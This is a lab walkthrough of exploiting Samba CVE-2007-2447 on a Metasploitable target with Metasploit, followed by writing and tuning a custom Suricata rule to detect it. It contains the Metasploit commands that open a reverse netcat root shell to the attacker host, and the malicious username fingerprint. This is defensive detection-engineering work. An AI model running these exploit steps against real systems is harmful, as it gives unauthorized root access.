# 05 - Samba usermap_script RCE + Detection Engineering

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application (**CVE-2007-2447**)
**Status:** VALIDATED - root shell obtained; detection gap found, custom rule authored + tuned, gap closed
**Attacker:** Kali `10.0.20.23` - **Target:** Metasploitable SMB `10.0.40.222:139`
**Detection:** custom Suricata rule (authored for this lab) + stock post-exploitation rules - **Wazuh:** blind (agentless container)

This is the lab's **detection-engineering** centerpiece. The exploit succeeded and was captured by Zeek, but **no Suricata signature alerted on it**. Rather than stop at "no alert," I authored a custom rule, watched v1 miss on a real-world encoding subtlety, diagnosed it, and tuned v2 until it fired. Finding a gap and closing it is the whole job.

---

## 1. The attack

`exploit/multi/samba/usermap_script` abuses the Samba "username map script" flaw - the username is executed as a shell command **as root** (smbd runs as root). Default `reverse_netcat` payload, `LHOST` = Kali:

```
use exploit/multi/samba/usermap_script
set RHOSTS 10.0.40.222
set LHOST 10.0.20.23
run
```

A root command shell opened directly:

![Samba usermap root shell](https://github.com/user-attachments/assets/14b9c532-a53a-4d42-838c-4d2c3b58c1d2)

```
id       -> uid=0(root) gid=0(root)
hostname -> c73cfe125252   (the container ID)
whoami   -> root
```

---

## 2. The detection gap - visibility without an alert

On the first run, Security Onion **captured** the attack - Zeek logged the SMB session:

![Zeek captured the SMB session](https://github.com/user-attachments/assets/60db8010-32b9-47e5-9b34-daafc8b64384)

```
zeek.conn   10.0.20.23 -> 10.0.40.222:139   tcp   protocol: smb
```

...but raised **no Suricata alert**. The only alerts in the window were unrelated CDN "Packed Executable Download" noise (Fastly/Akamai, port 80):

![No exploit alert - only unrelated CDN noise](https://github.com/user-attachments/assets/05965666-ceed-4ec8-9efd-d1febe7cca6e)

**Why:** the ET Open ruleset no longer ships a signature for this 2007-era CVE. The packets are on disk (Zeek + PCAP), but nothing alerts an analyst. **Visibility != detection** - a real coverage gap, and the most important lesson in this walkthrough.

---

## 3. Bonus - post-exploitation IS caught by stock rules

Interacting with the shell tripped existing rules on the **commands themselves**, even with no exploit-trigger signature:

| Signature | Severity | What it caught |
|---|---|---|
| GPL ATTACK_RESPONSE id check returned root | medium | the `id` output (`uid=0(root)`) over the reverse shell on port 4444 |
| ET HUNTING Whoami Command Inbound On High Port | low | the `whoami` command over port 4444 |

![No exploit alert - only unrelated CDN noise](https://github.com/user-attachments/assets/76ba0d11-cca0-4cba-8c28-a7ccad17f470)

![Post-exploitation in Hunt](https://github.com/user-attachments/assets/992859a8-b3d4-4e10-9c40-d5183dacd64e)

So the attack's **aftermath** is detectable out of the box - the gap is specifically the exploit **trigger**. A custom rule gives earlier, exploit-specific detection.

---

## 4. Detection engineering - closing the gap

The Metasploit module sends a malicious SMB username, so the fingerprint is that byte sequence:

```
username sent:     /=`nohup <payload>`
fingerprint bytes: 2f 3d 60 6e 6f 68 75 70   ("/=" + backtick + "nohup")
```

**v1** matched the ASCII bytes and **did not fire** on re-test. Diagnosis: modern SMB negotiates **Unicode**, so the username goes out **UTF-16LE** - a null byte after every character (`2f 00 3d 00 60 00 6e 00 ...`) - and the ASCII content couldn't match.

**v2** uses a PCRE that tolerates an optional null after each byte, matching **both** encodings:

```
alert tcp any any -> any [139,445] (msg:"LOCAL EXPLOIT Samba usermap_script CVE-2007-2447 RCE attempt"; \
  flow:to_server,established; \
  pcre:"/\x2f\x00?\x3d\x00?\x60\x00?\x6e\x00?\x6f\x00?\x68\x00?\x75\x00?\x70/"; \
  reference:cve,2007-2447; classtype:attempted-admin; priority:1; sid:1000001; rev:2;)
```

Re-deployed via the SO **Detections** GUI (status: Enabled) and re-ran the exploit. The rule fired - **HIGH severity**, on the SMB exploit connection itself (`10.0.20.23 -> 10.0.40.222:139`), **before** any post-exploitation commands:

![Post-exploitation alerts from stock rules](https://github.com/user-attachments/assets/b3074aea-46f5-4488-a0d9-5c1403ce6314)

![Post-exploitation in Hunt](https://github.com/user-attachments/assets/928b9f16-af9e-4de0-b9fd-b514a42909e5)

**Gap closed.** Full rule and the v1 -> v2 story: [`configs/security-onion/local.rules`](../../configs/security-onion/local.rules).

---

## 5. Host layer - Wazuh blind

No results for the vuln-host agent - smbd is in the **agentless container**, the same blind spot as WT01 / WT03 / WT04:

![Wazuh - no results for the exploit](https://github.com/user-attachments/assets/132dec90-ca14-46b6-a8ec-264082f63778)

---

## 6. Triage

Confirmed **RCE to root** over SMB. Source `10.0.20.23` (internal). With the custom rule live, an analyst now gets a **HIGH** alert on the exploit attempt itself, plus the post-exploitation `id`/`whoami` alerts as corroboration - a clean, layered signal. Isolate and rebuild the target.

---

## 7. Mitigation & remediation

- **Patch Samba** - the flaw is fixed in 3.0.25+; never run vulnerable legacy versions.
- **Restrict SMB exposure** and segment the network so SMB isn't reachable from untrusted subnets.
- **Egress filtering** would break the reverse-shell callback to the attacker.
- Disable the `username map script` option if the feature isn't needed.
